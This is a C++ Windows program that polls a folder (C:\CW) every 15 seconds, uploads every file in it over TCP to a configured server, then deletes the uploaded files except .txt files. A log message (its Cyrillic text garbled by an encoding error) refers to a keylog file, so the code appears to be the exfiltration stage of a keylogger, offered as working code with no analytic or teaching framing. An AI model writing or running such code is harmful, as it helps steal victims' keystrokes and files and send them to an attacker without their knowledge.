#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <vector>
#include <fstream>
#include <filesystem>
#include <string>
#include <thread>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")

using namespace std;
namespace fs = std::filesystem;

bool sendFile(SOCKET clientSocket, const string& filePath) {
    const short BUFF_SIZE = 1024;
    vector<char> fileBuffer(BUFF_SIZE);

    fs::path filePathObj(filePath);
    string fileName = filePathObj.filename().string();

    int fileNameSize = fileName.size();
    send(clientSocket, reinterpret_cast<char*>(&fileNameSize), sizeof(fileNameSize), 0);
    send(clientSocket, fileName.c_str(), fileNameSize, 0);

    ifstream file(filePath, ios::binary);
    if (!file.is_open()) {
        cerr << "�� ������� ������� ����: " << filePath << endl;
        return false;
    }

    while (file.read(fileBuffer.data(), BUFF_SIZE) || file.gcount() > 0) {
        int bytesRead = static_cast<int>(file.gcount());
        if (send(clientSocket, fileBuffer.data(), bytesRead, 0) == SOCKET_ERROR) {
            cerr << "������ ��� �������� �����: " << WSAGetLastError() << endl;
            file.close();
            return false;
        }
    }

    file.close();
    return true;
}

bool sendAllFiles(const string& serverIP, short serverPort, const string& directoryPath) {
    WSADATA wsData;
    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
        cerr << "������ ������������� WinSock: " << WSAGetLastError() << endl;
        return false;
    }

    for (const auto& entry : fs::directory_iterator(directoryPath)) {
        if (entry.is_regular_file()) {
            SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
            if (clientSocket == INVALID_SOCKET) {
                cerr << "������ �������� ������: " << WSAGetLastError() << endl;
                continue;
            }

            sockaddr_in serverInfo = {};
            serverInfo.sin_family = AF_INET;
            serverInfo.sin_port = htons(serverPort);
            inet_pton(AF_INET, serverIP.c_str(), &serverInfo.sin_addr);

            if (connect(clientSocket, (sockaddr*)&serverInfo, sizeof(serverInfo)) == SOCKET_ERROR) {
                cerr << "������ ����������� � �������: " << WSAGetLastError() << endl;
                closesocket(clientSocket);
                continue;
            }

            cout << "�������� �����: " << entry.path().string() << endl;
            sendFile(clientSocket, entry.path().string());

            closesocket(clientSocket);
        }
    }

    WSACleanup();
    return true;
}


void clearDirectoryExceptTxt(const string& directoryPath) {
    for (const auto& entry : fs::directory_iterator(directoryPath)) {
        if (fs::is_regular_file(entry) && entry.path().extension() != ".txt") {
            fs::remove(entry);
            cout << "������ ����: " << entry.path().filename().string() << endl;
        }
    }
    cout << "������� ��������� (���� � keylog � .txt �� ������)." << endl;
}


void startTransfer(string serverIP, short serverPort, string directoryPath, int time_sleep) {
    while (true) {
        if (!fs::is_empty(directoryPath)) {
            if (sendAllFiles(serverIP, serverPort, directoryPath)) {
                cout << "�������� ������ ���������." << endl;
                clearDirectoryExceptTxt(directoryPath);  // ������� ����������, ����� ������ .txt
            }
            else {
                cerr << "������ �������� ������." << endl;
            }
        }
        else {
            cout << "���������� �����. �������� ����� ������..." << endl;
        }

        // �������� ����� ��������� ��������� ����������
        this_thread::sleep_for(chrono::seconds(time_sleep));
    }
}


int main() {
    system("chcp 1251");
    string serverIP = "127.0.0.1";
    short serverPort = 54000;
    string directoryPath = "C:\\CW";

    startTransfer(serverIP, serverPort, directoryPath, 15);

    return 0;
}

